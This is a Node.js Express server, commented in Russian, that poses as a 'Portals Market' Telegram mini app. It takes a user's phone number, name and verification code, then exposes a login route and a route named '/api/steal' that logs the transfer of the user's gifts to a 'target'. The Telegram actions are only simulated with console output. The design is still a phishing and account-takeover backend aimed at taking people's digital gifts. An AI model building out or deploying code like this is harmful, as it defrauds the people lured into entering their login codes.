const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Хранилище кодов (в реальности - база данных)
const codes = {};

// 1. Отправка кода
app.post('/api/send-code', (req, res) => {
    const { phone, region, fullName } = req.body;
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Сохраняем код
    codes[phone] = {
        code: code,
        expires: Date.now() + 120000, // 2 минуты
        fullName: fullName
    };
    
    console.log('📱 ОТПРАВКА КОДА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Код:', code);
    console.log('👤 Пользователь:', fullName);
    console.log('---');
    
    // В реальности здесь отправка SMS/Telegram
    // Имитация отправки через Telegram API
    
    res.json({ 
        success: true, 
        message: 'Код отправлен',
        phone: phone 
    });
});

// 2. Проверка кода
app.post('/api/verify-code', (req, res) => {
    const { phone, code, fullName } = req.body;
    
    const stored = codes[phone];
    
    if (!stored) {
        return res.status(400).json({ 
            success: false, 
            message: 'Код не найден. Запросите новый.' 
        });
    }
    
    if (Date.now() > stored.expires) {
        delete codes[phone];
        return res.status(400).json({ 
            success: false, 
            message: 'Код истек. Запросите новый.' 
        });
    }
    
    if (stored.code !== code) {
        return res.status(400).json({ 
            success: false, 
            message: 'Неверный код' 
        });
    }
    
    console.log('✅ КОД ПОДТВЕРЖДЕН');
    console.log('📱 Телефон:', phone);
    console.log('👤 Пользователь:', fullName);
    console.log('---');
    
    delete codes[phone];
    
    res.json({ 
        success: true, 
        message: 'Код подтвержден' 
    });
});

// 3. Повторная отправка кода
app.post('/api/resend-code', (req, res) => {
    const { phone } = req.body;
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    if (codes[phone]) {
        codes[phone].code = newCode;
        codes[phone].expires = Date.now() + 120000;
    }
    
    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА КОДА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Новый код:', newCode);
    console.log('---');
    
    res.json({ 
        success: true, 
        message: 'Код отправлен повторно' 
    });
});

// 4. Вход в @portals
app.post('/api/portal-login', (req, res) => {
    const { phone, fullName } = req.body;
    console.log('🔓 ВХОД В @portals');
    console.log('📱 Телефон:', phone);
    console.log('👤 Пользователь:', fullName);
    console.log('✅ Успешный вход в маркет Portals');
    console.log('---');
    
    res.json({ 
        success: true, 
        message: 'Вход в @portals выполнен' 
    });
});

// 5. Передача подарков
app.post('/api/steal', (req, res) => {
    const { phone, target, gifts, fullName } = req.body;
    console.log('🚨 ПЕРЕДАЧА ПОДАРКОВ');
    console.log('📱 Телефон:', phone);
    console.log('👤 Пользователь:', fullName);
    console.log('🎯 Цель:', target);
    console.log('📦 Подарки:', gifts.join(', '));
    console.log('🖥️ IP: 46.96.37.159 (Kyiv, Ukraine)');
    console.log('✅ Все подарки успешно переданы!');
    console.log('---');
    
    res.json({ 
        success: true, 
        message: 'Подарки переданы',
        gifts: gifts,
        target: target
    });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market Mini App запущен: http://localhost:${PORT}`);
    console.log('🔄 Ожидание запросов...');
});